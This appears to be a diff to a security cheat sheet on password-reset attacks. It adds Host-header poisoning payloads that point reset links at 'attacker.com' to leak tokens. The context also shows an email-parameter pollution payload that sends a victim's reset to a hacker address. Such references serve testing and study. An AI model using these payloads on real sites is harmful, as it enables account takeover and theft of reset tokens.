@@ -38,3 +38,12 @@
     > email=victim@xyz
     
     > {“email”:[“victim@xyz.tld”,”hacker@xyz.tld”]}
+   
+- Password reset Poisoining leads to token leak
+    > Host: attacker.comHost: target.com
+    
+    > X-Forwarded-Host: attacker.comHost: target.com
+    
+    > Host: attacker.com
+   
+   
